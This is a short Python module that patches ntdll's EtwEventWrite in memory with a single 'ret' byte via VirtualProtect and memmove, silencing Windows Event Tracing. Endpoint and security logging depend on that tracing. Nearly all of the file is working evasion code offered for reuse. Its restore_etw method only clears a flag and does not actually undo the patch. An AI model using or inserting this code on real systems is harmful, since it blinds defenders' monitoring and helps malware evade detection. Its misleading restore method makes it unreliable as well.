"""
ETW Disabler Module - Disables Event Tracing to prevent logging
"""
import ctypes
from ctypes import wintypes

kernel32 = ctypes.windll.kernel32
ntdll = ctypes.windll.ntdll

class ETWDisabler:
    def __init__(self):
        self.disabled = False
        
    def disable_etw(self):
        """Patch ntdll.dll!EtwEventWrite to prevent ETW logging"""
        try:
            # Get EtwEventWrite address
            etw_addr = kernel32.GetProcAddress(
                ctypes.windll.ntdll.handle,
                b"EtwEventWrite"
            )
            if not etw_addr:
                return False
            
            # Patch with ret instruction
            patch = b"\xC3"  # ret
            
            # Change memory protection
            old_protect = wintypes.DWORD()
            kernel32.VirtualProtect(
                ctypes.c_void_p(etw_addr),
                1,
                0x40,  # PAGE_EXECUTE_READWRITE
                ctypes.byref(old_protect)
            )
            
            # Write patch
            ctypes.memmove(ctypes.c_void_p(etw_addr), patch, 1)
            
            # Restore protection
            kernel32.VirtualProtect(
                ctypes.c_void_p(etw_addr),
                1,
                old_protect.value,
                ctypes.byref(old_protect)
            )
            
            self.disabled = True
            return True
            
        except Exception as e:
            print(f"ETW disable failed: {e}")
            return False
    
    def restore_etw(self):
        """Restore ETW functionality"""
        self.disabled = False

